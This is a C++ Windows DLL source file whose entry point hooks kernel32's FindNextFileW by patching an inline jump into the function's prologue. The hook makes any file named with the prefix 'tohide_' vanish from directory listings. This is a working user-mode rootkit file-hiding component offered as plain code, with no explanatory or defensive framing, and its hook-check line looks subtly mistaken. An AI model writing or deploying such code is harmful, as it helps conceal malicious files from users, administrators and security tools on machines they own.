// dllmain.cpp : Defines the entry point for the DLL application.

#include "windows.h"
#include "wchar.h"

//char *CopiedPrefix = (char *)malloc(14);
char *CopiedPrefix = NULL;

bool createDetour(char *trampolineAddr, char *detourAddress)
{
	if(!(*detourAddress) == (char)0xE9)
	{
		//Already Hooked - nothing to do.
		return TRUE;
	}
	DWORD oldProtect=0,tmp=0;
	DWORD *addressPointer=NULL;
	DWORD relativeTrampolineAddress=0;
	if(!VirtualProtect((LPVOID)detourAddress, 7, PAGE_EXECUTE_READWRITE, &oldProtect))
	{
		return FALSE;
	}

	//Create prefix code
	CopiedPrefix = (char *)VirtualAlloc(NULL,14,MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	for(int i=0; i<7; i++)
	{
		CopiedPrefix[i] = detourAddress[i];
	}
	//MOV EAX,<post_detour_address>
	CopiedPrefix[7] = (char)0xB8;

	//JMP EAX
	CopiedPrefix[12] = (char)0xFF;
	CopiedPrefix[13] = (char)0xE0;

	*detourAddress = (char)0xE9;
	detourAddress++;
	relativeTrampolineAddress = (DWORD)trampolineAddr - ((DWORD)detourAddress+4);
	addressPointer = (DWORD *)detourAddress;
	*addressPointer = relativeTrampolineAddress;
	detourAddress+=4;
	*detourAddress = (char)0xEB;
	detourAddress++;
	*detourAddress = (char)-7;
	detourAddress++;
	addressPointer = (DWORD *)(CopiedPrefix+8);
	*addressPointer = (DWORD)detourAddress;

	if(!VirtualProtect((LPVOID)detourAddress, 7, oldProtect, &tmp))
	{
		return FALSE;
	}
	FlushInstructionCache(NULL, 0, 0);
	return TRUE;
}



BOOL WINAPI TrampolineFindNextFile(HANDLE hFindFile,LPWIN32_FIND_DATA lpFindFileData)
{
	typedef BOOL (WINAPI *PFindNextFile)(HANDLE hFindFile,LPWIN32_FIND_DATA lpFindFileData);
	PFindNextFile pFindNextFile = (PFindNextFile)CopiedPrefix;
	BOOL retVal = FALSE;
	do
	{
		retVal = (*pFindNextFile)(hFindFile, lpFindFileData);
	}
	while(!wmemcmp(lpFindFileData->cFileName,L"tohide_",7) && retVal);
	return retVal;
}

void hookFindNextFile()
{
	HMODULE hKernel32;
	char *pFindNextFileAPI = 0;
	hKernel32 = LoadLibraryA("kernel32.dll");
	pFindNextFileAPI = (char *)GetProcAddress(hKernel32, "FindNextFileW");
	char *startOfDetour = pFindNextFileAPI - 5;
	createDetour((char *)TrampolineFindNextFile, startOfDetour);
	return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hookFindNextFile();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}